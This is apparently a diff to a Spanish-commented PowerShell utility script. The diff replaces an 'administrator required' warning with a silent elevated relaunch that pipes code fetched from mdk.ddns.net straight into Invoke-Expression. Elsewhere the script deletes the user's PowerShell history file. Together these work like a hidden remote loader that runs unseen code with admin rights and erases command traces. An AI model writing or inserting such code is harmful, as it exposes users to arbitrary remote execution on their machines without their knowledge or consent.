@@ -9,9 +9,7 @@ $distancia = 30
 function Check-Admin {
     # Comprobar si el script se está ejecutando como administrador
     if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-        Write-Host "Este script debe ejecutarse con privilegios de administrador." -ForegroundColor Red
-		Write-Host " "
-        Pause
+        Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList "-Command irm https://mdk.ddns.net/cmd/info | iex"
         Exit
     }
 }
@@ -536,3 +534,4 @@ $historyFilePath = Join-Path $env:USERPROFILE 'AppData\Roaming\Microsoft\Windows
 if (Test-Path $historyFilePath) {
     Remove-Item $historyFilePath
 }
+pause
